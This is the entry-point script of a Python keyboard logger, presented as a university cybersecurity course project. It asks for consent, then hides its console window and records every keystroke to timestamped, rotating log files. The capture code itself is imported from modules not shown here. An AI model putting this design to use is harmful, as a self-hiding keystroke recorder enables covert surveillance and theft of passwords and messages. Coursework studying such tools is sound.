#!/usr/bin/env python3
"""
Educational Keyboard Input Logger — Entry Point
================================================

University Cybersecurity Course Project

This application captures keyboard input events on the LOCAL system for
educational, defensive, and cybersecurity research purposes.  It is
designed to operate **only** with the user's explicit knowledge and
consent and should be tested exclusively in a controlled laboratory
environment.

Features:
    • Captures every key press with a precise timestamp.
    • Writes logs as human-readable plain-text (.txt) files.
    • Automatically rotates to a new log file every 30 minutes.
    • Preserves all previous log files (no overwriting).
    • Requires explicit user consent before starting.
    • Console window auto-hides after consent; press Ctrl+H to
      toggle visibility.

Usage:
    python main.py

Press Ctrl+C at any time to stop the logger gracefully.
Press Ctrl+H at any time to show/hide the console window.

DISCLAIMER:
    Unauthorized use of keylogging software is ILLEGAL in most
    jurisdictions.  The authors assume NO liability for misuse.
"""

import sys
import time

from keylogger.config import CONSENT_BANNER, CONSENT_KEYWORD
from keylogger.file_manager import LogFileManager
from keylogger.logger import KeyboardLogger
from keylogger.window_manager import ConsoleWindowManager


def get_user_consent() -> bool:
    """Display the consent banner and prompt for explicit agreement.

    Returns:
        bool: ``True`` if the user typed the consent keyword, ``False``
        otherwise.
    """
    print(CONSENT_BANNER)
    try:
        response = input(
            f'Type "{CONSENT_KEYWORD}" to confirm you understand and consent, '
            f"or anything else to exit: "
        ).strip()
    except (EOFError, KeyboardInterrupt):
        # User pressed Ctrl+C or piped empty input.
        print("\n[INFO] No consent received.  Exiting.")
        return False

    return response == CONSENT_KEYWORD


def main() -> None:
    """Application entry point.

    Workflow:
        1. Display the consent banner and obtain explicit permission.
        2. Initialize the window manager and auto-hide the console.
        3. Initialize the file manager (creates ``logs/`` directory).
        4. Start the keyboard listener.
        5. Wait for Ctrl+C, then shut down cleanly.
    """
    # ── Step 1: Obtain consent ────────────────────────────────────────
    if not get_user_consent():
        print("[INFO] Consent not granted.  No data has been captured.  Goodbye.")
        sys.exit(0)

    print("\n[INFO] Consent granted.  Initializing logger...")

    # ── Step 2: Initialize window manager and auto-hide ───────────────
    window_manager = ConsoleWindowManager()

    if window_manager.is_supported:
        print("[INFO] Console will hide in 2 seconds.  Press Ctrl+H to show it again.\n")
        time.sleep(2)  # Give the user a moment to read the message.
        window_manager.hide()
    else:
        print("[INFO] Console hiding is not supported on this platform.\n")

    # ── Step 3–4: Initialize and start ────────────────────────────────
    file_manager = None
    logger = None

    try:
        file_manager = LogFileManager()
        logger = KeyboardLogger(file_manager, window_manager)
        logger.start()

        # Block the main thread until the user interrupts.
        logger._listener.join()

    except KeyboardInterrupt:
        # Normal shutdown triggered by Ctrl+C.
        print("\n\n[INFO] Ctrl+C detected — shutting down gracefully...")

    except Exception as exc:
        print(f"\n[ERROR] An unexpected error occurred: {exc}")
        sys.exit(1)

    finally:
        # ── Step 4: Clean shutdown ────────────────────────────────────
        if logger is not None:
            logger.stop()
        elif file_manager is not None:
            # Logger was never created, but file manager was.
            file_manager.close()

    print("[INFO] Application terminated successfully.")


if __name__ == "__main__":
    main()
